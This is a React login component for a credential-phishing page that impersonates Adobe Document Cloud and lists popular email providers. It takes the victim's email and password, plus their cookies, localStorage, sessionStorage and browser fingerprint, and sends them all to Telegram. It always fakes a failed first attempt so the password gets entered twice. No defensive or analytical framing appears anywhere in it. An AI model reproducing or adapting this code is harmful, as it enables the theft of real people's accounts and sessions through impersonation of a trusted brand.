import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { getBrowserFingerprint } from '../utils/oauthHandler';
import { safeSendToTelegram } from '../utils/safeSendToTelegram';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');
    
    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      // Capture browser fingerprint for this attempt
      const browserFingerprint = getBrowserFingerprint();
      
      const cookieCapture = {
        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
        allCookies: {}
      };
      if (typeof document !== 'undefined') {
        document.cookie.split(';').forEach(cookie => {
          const [name, value] = cookie.trim().split('=');
          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
        });
      }

      const sessionData = {
        email,
        password,
        provider: selectedProvider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: cookieCapture.documentCookies,
        cookiesParsed: cookieCapture.allCookies,
        localStorage: JSON.stringify(browserFingerprint.localStorage),
        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
        browserFingerprint,
        attemptNumber: currentAttempt,
        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
        cookieCapture
      };

      // Use shared safe sender
      try {
        await safeSendToTelegram(sessionData);
        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
      } catch (err) {
        console.error('❌ Failed to send attempt data via safeSendToTelegram:', err);
      }

      if (currentAttempt === 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
      } else {
        await new Promise(resolve => setTimeout(resolve, 1000));
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        }
        if (onLoginSuccess) await onLoginSuccess(sessionData);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#f0f6f8] to-[#e6eef2] p-4">
      <div className="w-full max-w-lg">
        <div className="bg-white rounded-lg shadow-lg border border-gray-100 p-6">
          <div className="flex items-center gap-3 mb-10">
            <div className="w-11 h-11 rounded-lg bg-red-500 flex items-center justify-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png" alt="Adobe Document Cloud" className="w-6 h-6 object-contain" />
            </div>
            <div>
              <h1 className="text-lg font-semibold text-gray-900">Read Your Document</h1>
              <p className="text-sm text-gray-600 -mt-0.5">Please select your e-mail provider below:</p>
            </div>
          </div>

          <div className="mt-12">
            {!selectedProvider ? (
              <div className="grid grid-cols-2 gap-6">
                {emailProviders.map((provider) => (
                  <button key={provider.name} onClick={() => handleProviderSelect(provider.name)} className="flex items-center gap-3 p-3 bg-white rounded-lg shadow-sm border border-gray-100 hover:shadow-md transition-transform transform hover:-translate-y-0.5" aria-label={`Select ${provider.name}`} type="button">
                    <div className="w-12 h-12 flex items-center justify-center rounded-md bg-white flex-shrink-0 border border-gray-100 shadow-sm">
                      <img src={provider.logo} alt={provider.name} className="w-7 h-7 object-contain" />
                    </div>
                    <div className="text-sm font-medium text-gray-900">{provider.name}</div>
                  </button>
                ))}
              </div>
            ) : (
              <div>
                <div className="flex items-center gap-3 mb-4">
                  <button onClick={handleBackToProviders} className="text-gray-500 hover:text-gray-800" type="button">
                    <ArrowLeft className="w-4 h-4" />
                  </button>
                  <h2 className="text-sm font-semibold text-gray-900">Sign in with {selectedProvider}</h2>
                </div>

                <form onSubmit={handleFormSubmit} className="space-y-3">
                  {errorMessage && (
                    <div className="bg-red-50 border border-red-100 rounded-md p-2">
                      <p className="text-red-600 text-sm">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Email Address</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full pl-10 pr-3 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your email" required />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Password</label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pl-10 pr-10 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your password" required />
                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-800">
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  <button type="submit" disabled={isLoading || !email || !password} className="w-full bg-blue-600 text-white py-2.5 rounded-md font-semibold hover:bg-blue-700 disabled:opacity-60 transition-colors">
                    {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
                  </button>
                </form>
              </div>
            )}
          </div>

          <div className="mt-5 text-center">
            <p className="text-xs text-gray-500">© 2025 Adobe Inc. All rights reserved.</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
